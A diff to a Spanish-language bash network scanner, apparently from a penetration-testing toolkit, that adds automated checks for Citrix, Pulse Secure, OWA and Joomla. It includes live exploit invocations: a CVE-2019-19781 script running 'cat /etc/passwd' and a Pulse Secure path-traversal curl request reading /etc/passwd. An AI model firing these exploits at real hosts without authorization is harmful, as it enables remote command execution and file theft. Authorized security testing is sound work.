@@ -119,6 +119,10 @@ exit
 fi
 ######################
 
+#aceptar versiones antiguas de SSL
+export OPENSSL_CONF=/usr/share/lanscanner/sslv1.conf
+
+
 if [[ $TYPE == "completo" ]] || [ $TYPE == "parcial" ]; then
 
 conexionInternet=`ping 8.8.8.8 -c 1 2>/dev/null | grep "1 received" | wc -l`
@@ -1816,7 +1820,11 @@ then
 					#echo "lista_subdominios $lista_subdominios"
 					for subdominio in $lista_subdominios; do													
 						echo -e "\t[+] subdominio: $subdominio"							
-						wget --timeout=20 --tries=1 http://$subdominio -O webClone/http-$subdominio.html
+						#wget --timeout=20 --tries=1 http://$subdominio -O webClone/http-$subdominio.html
+						curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 http://$subdominio > webClone/http-$subdominio.html
+						
+						
+    
 						sed -i "s/\/index.php//g" webClone/http-$subdominio.html
 						sed -i "s/https/http/g" webClone/http-$subdominio.html						
 						sed -i "s/www.//g" webClone/http-$subdominio.html	
@@ -1843,7 +1851,7 @@ then
 						echo -e "\t\tnoEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
 						
 						if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
-						
+							echo "Realizando tests adicionales "
 							echo $checksumline >> webClone/checksumsEscaneados.txt
 							if [ $internet == "s" ]; then 	
 								echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
@@ -2032,12 +2040,56 @@ then
 							fi
 							###################################	
 							
+							#######  citrix (domain) ######
+							grep -qi citrix .enumeracion/"$subdominio"_"$port"_webData.txt
+							greprc=$?
+							if [[ $greprc -eq 0 ]];then 		
+								wpscan  --update >/dev/null 						
+								echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($subdominio)"
+								
+								CVE-2019-19781.sh $subdominio $port "cat /etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
+								egrep --color=never "root" logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt > .vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
+								
+							fi
+							###################################	
+							
+							#######  Pulse secure (domain) ######
+							grep -qi pulse .enumeracion/"$subdominio"_"$port"_webData.txt
+							greprc=$?
+							if [[ $greprc -eq 0 ]];then 		
+								wpscan  --update >/dev/null 						
+								echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($subdominio)"
+								
+								curl --path-as-is -s -k "http://$subdominio/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
+								egrep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt > .vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
+								
+							fi
+							###################################
+							
+							
+							#######  OWA (domain) ######
+							grep -qi Outlook .enumeracion/"$subdominio"_"$port"_webData.txt
+							greprc=$?
+							if [[ $greprc -eq 0 ]];then 		
+								wpscan  --update >/dev/null 						
+								echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($subdominio)"
+								
+								owa.pl -host $subdominio -port $port  > logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
+								egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt > .vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
+								
+							fi
+							###################################		
+							
+							
+							
 							#######  joomla (domain) ######
 							grep -qi joomla .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
 							if [[ $greprc -eq 0 ]];then 										
 								echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($subdominio)"
 								joomscan.sh -u http://$subdominio/ > .enumeracion/"$subdominio"_"$port"_joomscan.txt &
+								
+								JoomlaJCKeditor.py --url "http://$subdominio" > .vulnerabilidades/"$subdominio"_"$port"_JoomlaJCKeditor.txt
 							fi
 							###################################	
 							
@@ -2100,7 +2152,8 @@ then
 				
 				#################  Realizar el escaneo por IP  ##############	
 				echo -e "\t[+]Escaneo solo por IP (http) $ip:$port"
-				wget --timeout=20 --tries=1 --no-check-certificate  http://$ip -O webClone/http-$ip.html
+				#wget --timeout=20 --tries=1 --no-check-certificate  http://$ip -O webClone/http-$ip.html
+				curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 http://$ip > webClone/http-$ip.html
 				sed -i "s/\/index.php//g" webClone/http-$ip.html
 				sed -i "s/https/http/g" webClone/http-$ip.html				 			
 				sed -i "s/www.//g" webClone/http-$ip.html	# En el caso de que www.dominio.com sae igual a dominio.com		
@@ -2125,7 +2178,7 @@ then
 				echo -e "\t\tnoEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
 						
 				if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
-						
+					echo "Realizando tests adicionales "	
 					echo $checksumline >> webClone/checksumsEscaneados.txt
 					if [ $internet == "s" ]; then 
 						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
@@ -2144,6 +2197,49 @@ then
 						egrep --color=never "\| [0-9]{1}" logs/vulnerabilidades/"$ip"_"$port"_wpscanUsers.txt | grep -v plugin | awk '{print $4}' > .vulnerabilidades/"$ip"_"$port"_wpusers.txt
 					fi
 					###########################
+					
+					
+					#######  citrix (ip) ######
+					grep -qi citrix .enumeracion/"$ip"_"$port"_webData.txt
+					greprc=$?
+					if [[ $greprc -eq 0 ]];then 		
+						wpscan  --update >/dev/null 						
+						echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($ip)"
+							
+						CVE-2019-19781.sh $ip $port "cat /etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt
+						egrep --color=never "root" logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt > .vulnerabilidades/"$ip"_"$port"_citrixVul.txt
+						
+					fi
+					###################################	
+					
+					
+					#######  Pulse secure (ip) ######
+					grep -qi pulse .enumeracion/"$ip"_"$port"_webData.txt
+					greprc=$?
+					if [[ $greprc -eq 0 ]];then 		
+						wpscan  --update >/dev/null 						
+						echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($ip)"
+						
+						curl --path-as-is -s -k "http://$ip/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt
+						egrep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt > .vulnerabilidades/"$ip"_"$port"_pulseVul.txt
+						
+					fi
+					###################################						
+					
+					
+					#######  OWA (ip) ######
+					grep -qi Outlook .enumeracion/"$ip"_"$port"_webData.txt
+					greprc=$?
+					if [[ $greprc -eq 0 ]];then 		
+						wpscan  --update >/dev/null 						
+						echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($ip)"
+						
+						owa.pl -host $ip -port $port  > logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt
+						egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt > .vulnerabilidades/"$ip"_"$port"_owaVul.txt
+						
+					fi
+					###################################	
+					
 				
 					#######  joomla (ip) ######
 					grep -qi joomla .enumeracion/"$ip"_"$port"_webData.txt
@@ -2151,6 +2247,8 @@ then
 					if [[ $greprc -eq 0 ]];then 										
 						echo -e "\t\t[+] Revisando vulnerabilidades de joomla (IP)"
 						joomscan.sh -u http://$ip/ > .enumeracion/"$ip"_"$port"_joomscan.txt &
+						
+						JoomlaJCKeditor.py --url "http://$ip" > .vulnerabilidades/"$ip"_"$port"_JoomlaJCKeditor.txt
 					fi
 					###################################		
 
@@ -2451,7 +2549,8 @@ then
 					for subdominio in $lista_subdominios; do
 						echo -e "\t[+] subdominio: $subdominio"	
 																		
-						wget --timeout=20 --tries=1 --no-check-certificate  https://$subdominio -O webClone/https-$subdominio.html
+						#wget --timeout=20 --tries=1 --no-check-certificate  https://$subdominio -O webClone/https-$subdominio.html
+						curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 https://$subdominio > webClone/https-$subdominio.html
 						sed -i "s/\/index.php//g" webClone/https-$subdominio.html 2>/dev/null
 						sed -i "s/https/http/g" webClone/https-$subdominio.html 2>/dev/null		
 						sed -i "s/www.//g" webClone/https-$subdominio.html 2>/dev/null # borrar subdominio www.dominio.com						
@@ -2476,6 +2575,7 @@ then
 						echo -e "\t\tnoEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
 						
 						if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
+							echo "Realizando tests adicionales "
 							echo $checksumline >> webClone/checksumsEscaneados.txt												
 							if [ $internet == "s" ]; then 	
 								echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
@@ -2615,12 +2715,54 @@ then
 							fi
 							###########################	
 							
+							#######  citrix (subdominio) ######
+							grep -qi citrix .enumeracion/"$subdominio"_"$port"_webData.txt
+							greprc=$?
+							if [[ $greprc -eq 0 ]];then 		
+								wpscan  --update >/dev/null 						
+								echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($subdominio)"
+							
+								CVE-2019-19781.sh $subdominio $port "cat /etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
+								egrep --color=never "root" logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt > .vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
+						
+							fi
+							###################################	
+							
+							
+							#######  Pulse secure (domain) ######
+							grep -qi pulse .enumeracion/"$subdominio"_"$port"_webData.txt
+							greprc=$?
+							if [[ $greprc -eq 0 ]];then 		
+								wpscan  --update >/dev/null 						
+								echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($subdominio)"
+								
+								curl --path-as-is -s -k "https://$subdominio/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
+								egrep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt > .vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
+								
+							fi
+							###################################	
+							
+							
+							#######  OWA (domain) ######
+							grep -qi Outlook .enumeracion/"$subdominio"_"$port"_webData.txt
+							greprc=$?
+							if [[ $greprc -eq 0 ]];then 		
+								wpscan  --update >/dev/null 						
+								echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($subdominio)"
+								
+								owa.pl -host $subdominio -port $port  > logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
+								egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt > .vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
+								
+							fi
+							###################################								
+							
 							#######  joomla (domain) ######
 							grep -qi joomla .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
 							if [[ $greprc -eq 0 ]];then 										
 								echo -e "\t\t[+] Revisando vulnerabilidades de joomla"
 								joomscan.sh -u https://$subdominio/ > .enumeracion/"$subdominio"_"$port"_joomscan.txt &
+								JoomlaJCKeditor.py --url "https://$subdominio" > .vulnerabilidades/"$subdominio"_"$port"_JoomlaJCKeditor.txt
 							fi
 							###################################	
 							
@@ -2687,7 +2829,8 @@ then
 				
 				############### Escaneo por IP ############
 				echo -e "[+]\tEscaneo solo por IP (https) $ip:$port"
-				wget --timeout=20 --tries=1 --no-check-certificate  https://$ip -O webClone/https-$ip.html
+				#wget --timeout=20 --tries=1 --no-check-certificate  https://$ip -O webClone/https-$ip.html
+				curl --max-time 20 --connect-timeout 20 --insecure --retry 2 --retry-delay 0 --retry-max-time 40 https://$ip > webClone/https-$ip.html
 				sed -i "s/\/index.php//g" webClone/https-$ip.html 2>/dev/null
 				sed -i "s/https/http/g" webClone/https-$ip.html 2>/dev/null				
 				sed -i "s/www.//g" webClone/https-$ip.html 2>/dev/null # 
@@ -2713,6 +2856,7 @@ then
 				echo -e "\t\tnoEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
 						
 				if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios								
+					echo "Realizando tests adicionales " 
 					echo $checksumline >> webClone/checksumsEscaneados.txt
 					if [ $internet == "s" ]; then 	
 						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
@@ -2747,6 +2891,46 @@ then
 						egrep --color=never "\| [0-9]{1}" logs/vulnerabilidades/"$ip"_"$port"_wpscanUsers.txt | grep -v plugin | awk '{print $4}' > .vulnerabilidades/"$ip"_"$port"_wpusers.txt
 					fi
 					###########################	
+					
+					#######  citrix (ip) ######
+					grep -qi citrix .enumeracion/"$ip"_"$port"_webData.txt
+					greprc=$?
+					if [[ $greprc -eq 0 ]];then 		
+						wpscan  --update >/dev/null 						
+						echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($ip)"
+							
+						CVE-2019-19781.sh $ip $port "cat /etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt
+						egrep --color=never "root" logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt > .vulnerabilidades/"$ip"_"$port"_citrixVul.txt
+						
+					fi
+					###################################	
+					
+					#######  Pulse secure (ip) ######
+					grep -qi pulse .enumeracion/"$ip"_"$port"_webData.txt
+					greprc=$?
+					if [[ $greprc -eq 0 ]];then 		
+						wpscan  --update >/dev/null 						
+						echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($ip)"
+							
+						curl --path-as-is -s -k "https://$ip/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt
+						egrep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt > .vulnerabilidades/"$ip"_"$port"_pulseVul.txt
+								
+					fi
+					###################################		
+					
+					
+					#######  OWA (ip) ######
+					grep -qi Outlook .enumeracion/"$ip"_"$port"_webData.txt
+					greprc=$?
+					if [[ $greprc -eq 0 ]];then 		
+						wpscan  --update >/dev/null 						
+						echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($ip)"
+						
+						owa.pl -host $ip -port $port  > logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt
+						egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt > .vulnerabilidades/"$ip"_"$port"_owaVul.txt
+						
+					fi
+					###################################					
 				
 					#######  joomla (IP) ######
 					grep -qi joomla .enumeracion/"$ip"_"$port"_webData.txt
@@ -2754,6 +2938,7 @@ then
 					if [[ $greprc -eq 0 ]];then 										
 						echo -e "\t\t[+] Revisando vulnerabilidades de joomla"
 						joomscan.sh -u https://$ip/ > .enumeracion/"$ip"_"$port"_joomscan.txt &
+						JoomlaJCKeditor.py --url "https://$ip" > .vulnerabilidades/"$ip"_"$port"_JoomlaJCKeditor.txt
 					fi
 					###################################	
 				
